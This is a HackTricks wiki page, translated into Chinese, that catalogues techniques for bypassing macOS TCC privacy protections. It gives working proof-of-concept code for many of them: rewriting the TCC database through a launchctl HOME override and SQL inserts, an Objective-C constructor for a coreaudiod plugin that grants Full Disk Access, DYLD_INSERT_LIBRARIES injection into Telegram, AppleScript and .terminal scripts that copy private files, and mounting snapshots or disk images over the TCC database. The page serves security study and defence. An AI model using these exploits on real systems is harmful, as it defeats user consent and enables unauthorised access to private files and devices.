# macOS TCC Bypasses

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 按功能分类

### 写入绕过

这不是绕过，这只是TCC的工作原理：**它不会阻止写入**。如果终端**无法访问用户的桌面以读取内容，它仍然可以写入其中**：

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

**扩展属性 `com.apple.macl`** 被添加到新的 **文件** 中，以便让 **创建者的应用** 能够读取它。

### TCC 点击劫持

可以**将一个窗口覆盖在 TCC 提示框上**，使用户在不知情的情况下**接受**它。您可以在 [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)\*\* 中找到 PoC\*\*。

<figure><img src="https://github.com/carlospolop/hacktricks/blob/cn/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### 通过任意名称请求 TCC

攻击者可以在 **`Info.plist`** 中创建任何名称的应用程序（例如 Finder、Google Chrome...），并让其请求访问某些受 TCC 保护的位置。用户会认为是合法应用程序在请求此访问权限。\
此外，可以**从 Dock 中移除合法应用程序并将伪造的应用程序放置其中**，因此当用户点击伪造的应用程序（可以使用相同的图标）时，它可能调用合法应用程序，请求 TCC 权限并执行恶意软件，使用户相信是合法应用程序请求了访问权限。

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

更多信息和 PoC 请参阅：

{% content-ref url="../../../macos-privilege-escalation.md" %}
[macos-privilege-escalation.md](../../../macos-privilege-escalation.md)
{% endcontent-ref %}

### SSH 绕过

默认情况下，通过 **SSH 访问** 具有 **"完全磁盘访问权限"**。为了禁用此功能，您需要将其列出但禁用（从列表中删除它不会删除这些权限）：

![](<../../../../../.gitbook/assets/image (569).png>)

在这里，您可以找到一些**恶意软件如何绕过此保护**的示例：

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
请注意，现在为了能够启用 SSH，您需要**完全磁盘访问权限**
{% endhint %}

### 处理扩展名 - CVE-2022-26767

属性 **`com.apple.macl`** 被赋予文件以授予**某个应用程序读取权限**。当**拖放**文件到应用程序上或用户**双击**文件以使用**默认应用程序**打开文件时，将设置此属性。

因此，用户可以**注册一个恶意应用程序**来处理所有扩展名，并调用启动服务来**打开**任何文件（因此恶意文件将被授予读取权限）。

### iCloud

授权 **`com.apple.private.icloud-account-access`** 可以与 **`com.apple.iCloudHelper`** XPC 服务通信，后者将**提供 iCloud 令牌**。

**iMovie** 和 **Garageband** 具有此授权以及其他授权。

有关从该授权中获取 icloud 令牌的漏洞的更多**信息**，请查看演讲：[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)

### kTCCServiceAppleEvents / 自动化

具有 **`kTCCServiceAppleEvents`** 权限的应用程序将能够**控制其他应用程序**。这意味着它可能能够**滥用授予其他应用程序的权限**。

有关 Apple 脚本的更多信息，请查看：

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

例如，如果一个应用程序具有**对 `iTerm` 的自动化权限**，例如在此示例中\*\*`Terminal`\*\* 具有对 iTerm 的访问权限：

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### 在 iTerm 上

没有 FDA 的 Terminal 可以调用具有 FDA 的 iTerm，并使用它执行操作：

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}

```bash
osascript iterm.script
```

#### 通过Finder

或者，如果一个应用程序可以通过Finder访问，它可以执行类似这样的脚本：

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## 通过应用程序行为

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

用户空间的 **tccd 守护程序** 使用 **`HOME`** **env** 变量来访问 TCC 用户数据库：**`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

根据[这篇 Stack Exchange 帖子](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)，由于 TCC 守护程序是通过 `launchd` 在当前用户域中运行的，可以**控制传递给它的所有环境变量**。\
因此，**攻击者可以在 `launchctl` 中设置 `$HOME` 环境** 变量指向一个**受控** **目录**，**重新启动** **TCC** 守护程序，然后**直接修改 TCC 数据库**，以获取**所有可用的 TCC 权限**，而无需提示最终用户。\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

Notes可以访问TCC受保护的位置，但是当创建一个笔记时，它会**创建在一个非受保护的位置**。因此，您可以要求Notes将受保护的文件复制到一个笔记中（因此在非受保护的位置），然后访问该文件：

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

二进制文件`/usr/libexec/lsd`与库`libsecurity_translocate`具有授权`com.apple.private.nullfs_allow`，允许其创建**nullfs**挂载，并具有授权`com.apple.private.tcc.allow`与\*\*`kTCCServiceSystemPolicyAllFiles`\*\*以访问每个文件。

可以向“Library”添加隔离属性，调用\*\*`com.apple.security.translocation`\*\* XPC服务，然后将Library映射到\*\*`$TMPDIR/AppTranslocation/d/d/Library`**，其中Library中的所有文档都可以**访问\*\*。

### CVE-2023-38571 - 音乐和电视 <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

\*\*`Music`**有一个有趣的功能：当它运行时，它会将拖放到**`~/Music/Music/Media.localized/Automatically Add to Music.localized`**的文件导入到用户的“媒体库”中。此外，它调用类似于：**`rename(a, b);`\*\*其中`a`和`b`为：

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

这个\*\*`rename(a, b);`**行为容易受到**竞争条件**的影响，因为可以在`Automatically Add to Music.localized`文件夹中放入一个伪造的**TCC.db**文件，然后当创建新文件夹(b)时，复制文件，删除它，并将其指向**`~/Library/Application Support/com.apple.TCC`\*\*/。

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

如果\*\*`SQLITE_SQLLOG_DIR="path/folder"`**基本上意味着**任何打开的数据库都会被复制到该路径\*\*。在这个CVE中，这个控制被滥用，以便在将要由具有FDA TCC数据库的进程打开的**SQLite数据库**中**写入**，然后滥用\*\*`SQLITE_SQLLOG_DIR`**与**文件名中的符号链接\*\*，因此当该数据库被**打开**时，用户的**TCC.db被覆盖**为已打开的数据库。\
**更多信息**[**在写作中**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html)**和**[**在讲座中**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s)。

### **SQLITE\_AUTO\_TRACE**

如果设置了环境变量\*\*`SQLITE_AUTO_TRACE`**，库**`libsqlite3.dylib`**将开始**记录\*\*所有SQL查询。许多应用程序使用这个库，因此可以记录它们所有的SQLite查询。

几个苹果应用程序使用这个库来访问TCC受保护的信息。

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

这个**环境变量被`Metal`框架使用**，它是各种程序的依赖，尤其是`Music`，它具有FDA。

设置以下内容：`MTL_DUMP_PIPELINES_TO_JSON_FILE="路径/名称"`。如果`路径`是一个有效的目录，该漏洞将被触发，我们可以使用`fs_usage`查看程序中发生了什么：

* 一个文件将被`open()`，名为`路径/.dat.nosyncXXXX.XXXXXX`（X是随机的）
* 一个或多个`write()`将内容写入文件（我们无法控制此过程）
* `路径/.dat.nosyncXXXX.XXXXXX`将被`rename()`为`路径/名称`

这是一个临时文件写入，接着是一个**不安全的`rename(old, new)`**。

这是不安全的，因为它必须**分别解析旧路径和新路径**，这可能需要一些时间，并且容易受到竞争条件的影响。欲了解更多信息，您可以查看`xnu`函数`renameat_internal()`。

{% hint style="danger" %}
因此，基本上，如果一个特权进程正在从您控制的文件夹重命名，您可能会获得RCE并使其访问不同的文件，或者像在此CVE中那样，打开特权应用程序创建的文件并存储FD。

如果重命名访问您控制的文件夹，同时您已修改了源文件或拥有FD，您可以更改目标文件（或文件夹）以指向符号链接，这样您可以随时写入。
{% endhint %}

这是CVE中的攻击示例：例如，要覆盖用户的`TCC.db`，我们可以：

* 创建`/Users/hacker/ourlink`指向`/Users/hacker/Library/Application Support/com.apple.TCC/`
* 创建目录`/Users/hacker/tmp/`
* 设置`MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
* 通过使用此环境变量运行`Music`来触发漏洞
* 捕获`/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX`（X是随机的）的`open()`
* 在这里，我们还为写入打开此文件，并保留文件描述符
* 在一个循环中原子地切换`/Users/hacker/tmp`和`/Users/hacker/ourlink`
* 我们这样做是为了最大化成功的机会，因为竞争窗口非常狭窄，但是输掉比赛的风险微乎其微
* 等待一会儿
* 测试我们是否幸运
* 如果没有，从头再来

更多信息请参阅[https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
现在，如果尝试使用环境变量`MTL_DUMP_PIPELINES_TO_JSON_FILE`，应用程序将无法启动
{% endhint %}

### Apple Remote Desktop

作为root，您可以启用此服务，**ARD代理将具有完全磁盘访问权限**，用户可以滥用这一点，使其复制新的**TCC用户数据库**。

## 通过**NFSHomeDirectory**

TCC在用户的HOME文件夹中使用数据库来控制用户特定资源的访问，位于\*\*$HOME/Library/Application Support/com.apple.TCC/TCC.db\*\*。\
因此，如果用户设法使用指向**不同文件夹**的$HOME环境变量重新启动TCC，用户可以在\*\*/Library/Application Support/com.apple.TCC/TCC.db\*\*中创建一个新的TCC数据库，并欺骗TCC授予任何应用程序任何TCC权限。

{% hint style="success" %}
请注意，Apple使用存储在用户配置文件中的设置来作为\*\*`NFSHomeDirectory`**属性的值，因此，如果您入侵了具有修改此值权限的应用程序（**`kTCCServiceSystemPolicySysAdminFiles`**），您可以使用TCC绕过**武器化\*\*此选项。
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**第一个POC**使用[dsexport](https://www.unix.com/man-page/osx/1/dsexport/)和[dsimport](https://www.unix.com/man-page/osx/1/dsimport/)来修改用户的**HOME**文件夹。

1. 为目标应用程序获取\_csreq\_ blob。
2. 放置一个带有所需访问权限和\_csreq\_ blob的虚假\_TCC.db\_文件。
3. 使用[dsexport](https://www.unix.com/man-page/osx/1/dsexport/)导出用户的目录服务条目。
4. 修改目录服务条目以更改用户的主目录。
5. 使用[dsimport](https://www.unix.com/man-page/osx/1/dsimport/)导入修改后的目录服务条目。
6. 停止用户的\_tccd\_并重新启动该进程。

第二个POC使用了\*\*`/usr/libexec/configd`**，其中具有值为`kTCCServiceSystemPolicySysAdminFiles`的`com.apple.private.tcc.allow`权限。**\
**通过使用**`-t`**选项运行**`configd`**，攻击者可以指定要加载的**自定义Bundle\*\*。因此，该漏洞**替换了**使用\*\*`configd`代码注入**更改用户主目录的**`dsexport`**和**`dsimport`\*\*方法。

有关更多信息，请查看[**原始报告**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)。

## 通过进程注入

有不同的技术可以注入代码到进程中并滥用其TCC权限：

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

此外，发现的绕过TCC最常见的进程注入是通过**插件（加载库）**。\
插件通常以库或plist的形式存在，将由主应用程序**加载**并在其上下文中执行。因此，如果主应用程序具有对TCC受限文件的访问权限（通过授予的权限或权限），**自定义代码也将具有该权限**。

### CVE-2020-27937 - Directory Utility

应用程序`/System/Library/CoreServices/Applications/Directory Utility.app`具有权限\*\*`kTCCServiceSystemPolicySysAdminFiles`**，加载带有**`.daplug`**扩展名的插件，并且**没有启用强化\*\*运行时。

为了武器化此CVE，**`NFSHomeDirectory`被更改**（滥用先前的权限），以便能够**接管用户的TCC数据库**以绕过TCC。

有关更多信息，请查看[**原始报告**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)。

### CVE-2020-29621 - Coreaudiod

二进制文件 **`/usr/sbin/coreaudiod`** 具有权限 `com.apple.security.cs.disable-library-validation` 和 `com.apple.private.tcc.manager`。第一个权限允许**进行代码注入**，第二个权限允许其访问**管理 TCC**。

该二进制文件允许从文件夹 `/Library/Audio/Plug-Ins/HAL` 加载**第三方插件**。因此，可以使用以下 PoC **加载插件并滥用 TCC 权限**：

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```

有关更多信息，请查阅[**原始报告**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)。

### 设备抽象层（DAL）插件

通过核心媒体I/O（具有\*\*`kTCCServiceCamera`**的应用程序）打开摄像头流的系统应用程序会在`/Library/CoreMediaIO/Plug-Ins/DAL`中加载**这些插件\*\*（不受SIP限制）。

只需在那里存储一个具有常见**构造函数**的库即可用于**注入代码**。

几个苹果应用程序存在此漏洞。

### Firefox

Firefox应用程序具有`com.apple.security.cs.disable-library-validation`和`com.apple.security.cs.allow-dyld-environment-variables`权限：

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```

### CVE-2020-10006

二进制文件 `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` 具有权限 **`com.apple.private.tcc.allow`** 和 **`com.apple.security.get-task-allow`**，这允许注入代码到进程中并使用 TCC 权限。

### CVE-2023-26818 - 电报

电报具有权限 **`com.apple.security.cs.allow-dyld-environment-variables`** 和 **`com.apple.security.cs.disable-library-validation`**，因此可以滥用它来**获取其权限**，例如使用摄像头录制。您可以在[**写作中找到有效载荷**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。

请注意如何使用环境变量加载库，创建了一个**自定义 plist** 来注入此库，并使用 **`launchctl`** 来启动它：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## 通过打开调用

即使在受沙盒限制的情况下，也可以调用\*\*`open`\*\*

### 终端脚本

在技术人员使用的计算机上，通常会为终端授予**完全磁盘访问权限（FDA）**，并且可以使用它来调用\*\*`.terminal`\*\*脚本。

**`.terminal`** 脚本是类似于以下具有要在\*\*`CommandString`\*\*键中执行的命令的属性列表文件：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```

一个应用程序可以在诸如 /tmp 这样的位置编写一个终端脚本，并使用如下命令启动它：

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## 通过挂载

### CVE-2020-9771 - mount\_apfs TCC绕过和提权

**任何用户**（甚至是非特权用户）都可以创建和挂载一个时间机器快照，并**访问该快照的所有文件**。\
唯一需要的特权是用于应用程序（如`Terminal`）具有**完全磁盘访问**（FDA）权限（`kTCCServiceSystemPolicyAllfiles`），需要由管理员授予。

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

更详细的解释可以在[**原始报告中找到**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**。**

### CVE-2021-1784 & CVE-2021-30808 - 在TCC文件上挂载

即使TCC DB文件受到保护，也可以**在目录上挂载**一个新的TCC.db文件：

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

查看[**原始报告**](https://theevilbit.github.io/posts/cve-2021-30808/)中的**完整利用**。

### asr

工具\*\*`/usr/sbin/asr`\*\*允许复制整个磁盘并在另一个位置挂载，绕过了TCC保护。

### 位置服务

在\*\*`/var/db/locationd/clients.plist`**中有第三个TCC数据库，用于指示允许访问**位置服务**的客户端。**\
**文件夹**`/var/db/locationd/`没有受到DMG挂载的保护\*\*，因此可以挂载我们自己的plist。

## 通过启动应用程序

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## 通过grep

在许多情况下，文件会在非受保护的位置存储敏感信息，如电子邮件、电话号码、消息...（这被视为苹果的一个漏洞）。

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## 合成点击

这种方法不再有效，但在过去[**曾经有效**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**：**

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

另一种方法是使用[**CoreGraphics事件**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf)：

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## 参考

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
